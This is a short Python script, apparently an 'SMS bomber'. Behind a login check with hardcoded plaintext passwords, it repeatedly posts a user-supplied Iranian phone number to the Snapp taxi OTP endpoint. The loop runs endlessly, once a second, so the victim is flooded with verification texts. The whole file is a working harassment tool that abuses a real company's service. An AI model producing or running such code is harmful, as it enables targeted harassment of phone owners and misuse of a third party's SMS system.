print("POWER BY DIPA AND MDRLAY (C)")
print("WARING! IN SORS HA GHEIER GHABLE FROS HAST WARING!")
w = {
    "dipa": "14001400dipa",
    "root": "root",
    "ahmadian": "amirmahdi"
}
enter_user = input("ENTER UERNAME :")
enter_pass = input("ENTER PASSWORD :")
while enter_user not in w or w[enter_user] != enter_pass:
    print("USERNAME OR PASSWORD NOT IN TO DETABAICE")
    enter_user = input("ENTER UERNAME (TRY AGAIN) :")
    enter_pass = input("ENTER PASSWORD (TRY AGAIN) :")
else:
    print("LOGIN SUCCESSFULY")
print("POWER BY DIPA AND MDRLAY")
import requests
import time
try:
    x = input("ENTER NUMBER PHONE :")
    while x == "":
        print("NOT NUMBER")
        x = input("ENTER NUMBER PHONE :")
    else:
        y = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        c = {"cellphone":"+98" + x}
    while True:
        requests.post(y,data=c)
        time.sleep(1)
        print("SMS SEND SUCCESSFULY")
except:
    print("POWER BY DIPA AND MDRLAY")